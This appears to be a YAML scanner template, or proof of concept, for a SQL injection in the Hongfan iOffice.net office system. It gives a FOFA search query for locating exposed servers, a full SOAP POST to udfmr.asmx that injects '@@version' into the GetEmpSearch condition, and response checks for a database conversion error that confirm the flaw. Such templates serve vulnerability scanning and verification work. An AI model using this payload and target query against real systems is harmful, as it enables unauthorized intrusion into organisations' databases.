info:
  vulId: hongfan_sqli_udfmr
  detail: 红帆系统sql注入漏洞
  fofaQuery: title="iOffice.net" || body="/iOffice/js" || (body="iOffice.net" && header!="couchdb" && header!="drupal") || body="iOfficeOcxSetup.exe" || body="Hongfan. All Rights Reserved"
rules:
  - request:
      payload:
        - "@@version"
      path: "{{rootUrl}}/iOffice/prg/set/wss/udfmr.asmx"
      method: POST
      headers:
        Pragma: no-cache
        Cache-Control: no-cache
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
        Origin: "{{rootUrl}}"
        Content-Type: application/soap+xml; charset=utf-8
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Referer: "{{rootUrl}}/ioffice/Login.aspx?ReturnUrl=%2fiOffice%2fdefault.aspx"
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
        Connection: close
      redirect: false
      dataTtpe: text
      data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap12:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap12=\"http://www.w3.org/2003/05/soap-envelope\">\r\n<soap12:Body>\r\n<GetEmpSearch xmlns=\"http://tempuri.org/ioffice/udfmr\">\r\n<condition>1={{payload}}</condition>\r\n</GetEmpSearch>\r\n</soap12:Body>\r\n</soap12:Envelope>"

    checksCondition: and

    checks:
      - checkType: string
        desireds:
          - 转换成数据类型
          - 失败
        place: body
        condition: and

      - checkType: status
        desireds:
          - 200
        condition: and